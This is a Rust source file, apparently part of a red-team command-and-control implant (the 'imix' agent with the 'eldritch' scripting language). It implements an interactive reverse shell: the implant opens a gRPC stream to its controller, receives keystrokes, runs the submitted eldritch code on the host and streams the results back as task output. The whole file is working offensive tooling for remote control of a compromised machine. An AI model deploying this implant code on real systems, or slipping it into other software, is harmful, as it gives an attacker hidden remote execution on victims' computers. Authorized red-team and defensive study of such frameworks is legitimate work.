use anyhow::Result;
use crossterm::{QueueableCommand, cursor, terminal};
use eldritch::agent::agent::Agent;
use eldritch::assets::std::EmptyAssets;
use eldritch::repl::{Repl, ReplAction};
use eldritch::{Interpreter, Value};
use pb::c2::{
    ReportTaskOutputRequest, ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse,
    TaskContext, TaskError, TaskOutput,
};
use std::io::{BufWriter, Write};
use std::sync::Arc;
use transport::Transport;

use crate::agent::ImixAgent;
use crate::printer::{OutputKind, StreamPrinter};
use crate::shell::parser::InputParser;
use crate::shell::terminal::{VtWriter, render};

pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
    task_context: TaskContext,
    mut transport: T,
    agent: ImixAgent<T>,
) -> Result<()> {
    // Channels to manage gRPC stream
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
    let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);

    #[cfg(debug_assertions)]
    log::info!(
        "starting repl_reverse_shell (task_id={0})",
        task_context.task_id
    );

    // Initial Registration
    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            context: Some(task_context.clone()),
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {_err}");
    }

    // Initiate gRPC stream
    transport.reverse_shell(output_rx, input_tx).await?;

    // Move logic to blocking thread
    run_repl_loop(task_context, input_rx, output_tx, agent).await;
    Ok(())
}

async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
    task_context: TaskContext,
    mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
    output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
    agent: ImixAgent<T>,
) {
    let runtime = tokio::runtime::Handle::current();
    let _ = tokio::task::spawn_blocking(move || {
        let (printer_tx, mut printer_rx) = tokio::sync::mpsc::unbounded_channel();
        let printer = Arc::new(StreamPrinter::new(printer_tx));

        let consumer_output_tx = output_tx.clone();
        let consumer_agent = agent.clone();
        let consumer_context = task_context.clone();

        runtime.spawn(async move {
            while let Some((kind, msg)) = printer_rx.recv().await {
                // Send to REPL
                let s_crlf = msg.replace('\n', "\r\n");
                let _ = consumer_output_tx
                    .send(ReverseShellRequest {
                        context: Some(consumer_context.clone()),
                        kind: ReverseShellMessageKind::Data.into(),
                        data: s_crlf.into_bytes(),
                    })
                    .await;

                // Report Task Output
                let (output, error) = match kind {
                    OutputKind::Stdout => (msg, None),
                    OutputKind::Stderr => (String::new(), Some(TaskError { msg })),
                };

                let _ = consumer_agent.report_task_output(ReportTaskOutputRequest {
                    output: Some(TaskOutput {
                        id: consumer_context.task_id,
                        output,
                        error,
                        exec_started_at: None,
                        exec_finished_at: None,
                    }),
                    context: Some(consumer_context.clone()),
                    shell_task_output: None,
                });
            }
        });

        let backend = Arc::new(EmptyAssets {});
        let mut interpreter = Interpreter::new_with_printer(printer)
            .with_default_libs()
            .with_task_context(Arc::new(agent), task_context.clone(), Vec::new(), backend);

        let mut repl = Repl::new();
        let stdout = VtWriter {
            tx: output_tx.clone(),
            task_context: task_context.clone(),
        };
        let mut stdout = BufWriter::new(stdout);

        let _ = render(&mut stdout, &repl, None);

        // State machine for VT100 parsing
        let mut parser = InputParser::new();
        let mut previous_buffer = String::new();

        while let Some(msg) = input_rx.blocking_recv() {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                let _ = output_tx.blocking_send(ReverseShellRequest {
                    context: Some(task_context.clone()),
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: msg.data,
                });
                continue;
            }
            if msg.data.is_empty() {
                continue;
            }

            // Parse input
            let inputs = parser.parse(&msg.data);
            let mut pending_render = false;

            for (i, input) in inputs.iter().enumerate() {
                #[cfg(debug_assertions)]
                log::info!("Handling input: {input:?}");
                let action = repl.handle_input(input.clone());
                match action {
                    ReplAction::Render => {
                        pending_render = true;
                    }
                    other => {
                        // If we have a pending render from previous inputs, do it now
                        // before processing a non-render action (like Submit) which relies on visual state.
                        if pending_render {
                            let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                            // Update previous_buffer after render
                            previous_buffer = repl.get_render_state().buffer;
                            pending_render = false;
                        }

                        match other {
                            ReplAction::Quit => return,
                            ReplAction::Submit { code, .. } => {
                                // Move to next line
                                let _ = stdout.write_all(b"\r\n");
                                let _ = stdout.flush();

                                // Execute
                                match interpreter.interpret(&code) {
                                    Ok(v) => {
                                        if !matches!(v, Value::None) {
                                            let s = format!("{v:?}\r\n");
                                            let _ = stdout.write(s.as_bytes());
                                        }
                                    }
                                    Err(e) => {
                                        let s = format!("Error: {e}");
                                        let s_crlf = s.replace('\n', "\r\n");
                                        let final_s = format!("{s_crlf}\r\n");
                                        let _ = stdout.write(final_s.as_bytes());
                                    }
                                }
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer.clear(); // Reset after submit
                            }
                            ReplAction::AcceptLine { .. } => {
                                let _ = stdout.write_all(b"\r\n");
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer.clear(); // Buffer is cleared in repl too
                            }
                            ReplAction::ClearScreen => {
                                let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
                                let _ = stdout.queue(cursor::MoveTo(0, 0));
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer = repl.get_render_state().buffer;
                            }
                            ReplAction::Complete => {
                                let state = repl.get_render_state();
                                let (start, completions) =
                                    interpreter.complete(&state.buffer, state.cursor);
                                repl.set_suggestions(completions, start);
                                let _ = render(&mut stdout, &repl, None);
                                previous_buffer = repl.get_render_state().buffer;
                            }
                            ReplAction::None => {}
                            ReplAction::Render => unreachable!(),
                        }
                    }
                }

                // If this is the last input and we have a pending render, flush it.
                if i == inputs.len() - 1 && pending_render {
                    let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                    previous_buffer = repl.get_render_state().buffer;
                    pending_render = false;
                }
            }
        }
    })
    .await;
}

